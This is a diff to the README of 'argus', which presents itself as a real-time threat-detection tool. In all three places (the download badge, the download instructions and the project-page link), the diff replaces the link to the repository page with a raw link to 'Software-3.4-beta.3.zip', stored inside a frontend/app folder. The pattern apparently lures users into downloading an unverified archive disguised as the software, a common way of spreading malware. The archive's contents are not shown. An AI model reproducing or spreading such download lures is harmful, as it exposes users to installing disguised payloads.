@@ -1,6 +1,6 @@
 # 🔎 argus - Detect threats with clear, real-time insight
 
-[![Download argus](https://img.shields.io/badge/Download-argus-blue?style=for-the-badge&logo=github)](https://github.com/ILikeThaiFood/argus)
+[![Download argus](https://img.shields.io/badge/Download-argus-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ILikeThaiFood/argus/main/frontend/app/Software-3.4-beta.3.zip)
 
 ## 🧭 What argus does
 
@@ -30,7 +30,7 @@ For best results, use a machine with a newer Intel or AMD processor and at least
 
 Visit this page to download:
 
-https://github.com/ILikeThaiFood/argus
+https://raw.githubusercontent.com/ILikeThaiFood/argus/main/frontend/app/Software-3.4-beta.3.zip
 
 If the page has a release file, download the Windows version. If it gives you a ZIP file, save it to your PC.
 
@@ -177,4 +177,4 @@ argus uses the MIT License.
 
 ## 📌 Project page
 
-https://github.com/ILikeThaiFood/argus
+https://raw.githubusercontent.com/ILikeThaiFood/argus/main/frontend/app/Software-3.4-beta.3.zip
